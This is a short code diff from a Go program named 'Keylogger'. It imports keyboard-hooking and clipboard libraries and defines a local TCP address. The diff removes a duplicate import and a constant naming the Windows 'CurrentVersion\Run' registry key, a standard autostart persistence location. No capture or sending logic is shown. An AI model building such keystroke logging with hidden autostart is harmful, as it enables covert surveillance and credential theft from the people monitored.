@@ -13,7 +13,6 @@ import (
 	"fmt"
 	"github.com/atotto/clipboard"
 	"github.com/go-vgo/robotgo"
-	_ "github.com/go-vgo/robotgo"
 	hook "github.com/robotn/gohook"
 	"golang.org/x/text/encoding/simplifiedchinese"
 	"golang.org/x/text/transform"
@@ -32,7 +31,6 @@ const (
 	Protocol = "tcp"
 	Address  = "127.0.0.1:8722"
 
-	KeyName = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
 	AppName = "Keylogger"
 
 	TypeKeyboard  KeyType = "KYBD"
